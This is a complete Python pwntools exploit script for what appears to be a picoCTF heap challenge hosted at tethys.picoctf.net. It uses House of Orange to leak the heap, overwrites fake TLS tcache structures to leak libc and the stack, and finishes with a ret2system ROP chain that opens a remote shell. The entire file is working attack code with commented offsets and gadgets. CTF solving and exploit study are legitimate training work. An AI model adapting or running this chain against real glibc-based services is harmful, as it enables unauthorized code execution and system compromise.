#!/usr/bin/env python3

from pwn import *

exe = ELF("hft_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("tethys.picoctf.net", 62238)

    return r


def pkt_send(size: int, data: bytes):
    r.send(p64(size))
    r.sendline(data)


# Note: sometimes the program will crash due to improper leak of addresses (unlucky NULL byte)
#       or a misplacment of mmap'ed memory (it doesn't always be placed above the TLS).
def main():
    r = conn()

    # ===============================================================
    # ======================= HOUSE OF ORANGE =======================
    # ===============================================================

    # Overwrite top_chunk to a small amount so that next allocation will
    # expand the heap and put the previous top_chunk in the unsortedbin
    pkt_send(0x18, b"A" * 0x10 + p64(0x1d51))   # note: it has to be aligned to 0x1000
    pkt_send(0x1f00, b"A" * 0x10)       # puts the top_chunk into unsortedbin

    # This leaks the heap since there's a heap pointer in the old location where the top_chunk resided
    # (this is due to some heap mechanism that puts a heap pointer in the third QWORD of our chunk).
    # It's important to send just 7 bytes + '\n' since `gets()` will automatically replace it witn 0x0
    pkt_send(0x18, p64(0x1)[:7])

    # Leak the heap
    r.recvuntil(b"PKT_DATA\x1b[m:[")
    exe.heap = u64(r.recvuntil(b"]", drop = True).ljust(8, b"\x00")) - 0x2b0
    log.info(f"heap: 0x{exe.heap:x}")

    # ==============================================================
    # ================= OVERWRITE TLS TO LEAK LIBC =================
    # ==============================================================

    # Create a fake TLS in the controlled heap addresses (unsortedbin chunk)
    fake_tls = flat(
        b"A" * 0x8,         # padding to avoid the program overwriting our fake tls
        p16(0x8) * 0x40,    # tcache_counts > 0 means there are chunks available (we won't need too many entries so it's quite small)
        p64(exe.heap + 0x440),  # overlap a tcache chunk over unsorted chunk to leak libc (size = 0x20)
        p64(exe.heap + 0x430),  # this one is needed to restore the unsorted chunk since we'll overwrite its metadata (size = 0x30)
        p64(exe.heap + 0x500) * 0x15,
        p64(exe.heap + 0x2d0),  # this will used to rewrite the TLS with new addresses (size = 0x110)
        p64(0x0) * 0x2,     # padding for tcache chunk (to avoid overwriting tls once the chunk is placed)
        p64(0x170)[:7]      # placed in the `prev_size` of the reminder just in case
                            # (probably isn't needed to not make the program crash)
    )
    pkt_send(0x168, fake_tls)

    # Allocate a chunk huge enough to be allocated thorugh mmap.
    # This will (not always tho) put the mmap'ed memory right above the TLS, to then be overflown.
    # Hint: "allocate a size greater than mp_.mmap_threshold"
    pkt_send(0x30010, b"A" * (0x31728 - 9*8) + p64(exe.heap + 0x2f0)[:7])

    # Leak libc by placing a tcache chunk above unsorted chunk
    pkt_send(0x18, p64(0x1)[:7])
    r.recvuntil(b"PKT_DATA\x1b[m:[")
    libc.address = u64(r.recvuntil(b"]", drop = True).ljust(8, b"\x00")) - (libc.sym.main_arena + 1744)
    log.info(f"libc: 0x{libc.address:x}")

    # Fixes the unsortedbin chunk just in case to avoid any possible crashes
    pkt_send(0x28, p64(0x0) + p64(0x170) + p64(0x1ba1) + p64(libc.sym.main_arena + 1744) + p64(libc.sym.main_arena + 1744)[:7])

    # ==============================================================
    # =========== REWRITE TLS TO LEAK STACK + RET2SYSTEM ===========
    # ==============================================================

    # Rewrite TLS to perform a stack leak through libc's `environ`
    fake_tls = flat(
        p16(0x8) * 0x40,
        p64(libc.sym.environ - 0x10),   # leak stack address (size = 0x20)
        p64(exe.heap + 0x500) * 0x16,
        p64(exe.heap + 0x2d0),          # this will used to rewrite the TLS with new addresses (size = 0x110)
        p64(0x0) * 0x2,
        p64(0x170)[:7]
    )
    pkt_send(0x180, p64(0x171) + b"A" * 0x10 + fake_tls)

    # Leak stack
    r.clean(1)       # there's some garbage before
    pkt_send(0x18, p64(0x1)[:7])
    r.recvuntil(b"PKT_DATA\x1b[m:[")
    ret_addr = u64(r.recvuntil(b"]", drop = True).ljust(8, b"\x00")) - 0x158
    log.info(f"ret_addr: 0x{ret_addr:x}")   # it's 8 bytes before the return address due to alignment

    # Rewrite TLS again so that we have a pointer to the stack.
    # Our point will be placed slightly before the return address of `gets()` (the main() doesn't return actually).
    # This due to some operations performed by `malloc.c` that would, otherwise, overwrite important data and crash
    fake_tls = flat(
        p16(0x8) * 0x40,
        p64(exe.heap + 0x500) * 0x4,
        p64(ret_addr - 0x20),   # points to return address of `gets()` (size = 0x60)
                                # it's 0x20 bytes before due to malloc performing `mov qword ptr [addr + 8], 0`
                                # plus some other operations nulling out important metadata on the stack
        p64(exe.heap + 0x500) * 0x13,
        p64(0x0) * 0x2,
        p64(0x170)[:7]
    )
    pkt_send(0x180, p64(0x171) + b"A" * 0x10 + fake_tls)

    # Overwrite `gets()` return address to perform "ret2system"
    pop_rdi = libc.address + 0x2a3e5
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    payload = flat(
        b"A" * 0x20,
        pop_rdi,
        bin_sh,
        pop_rdi + 1,
        libc.sym.system
    )
    pkt_send(0x58, payload)

    # Enjoy the shell
    r.interactive("$ ")


if __name__ == "__main__":
    main()
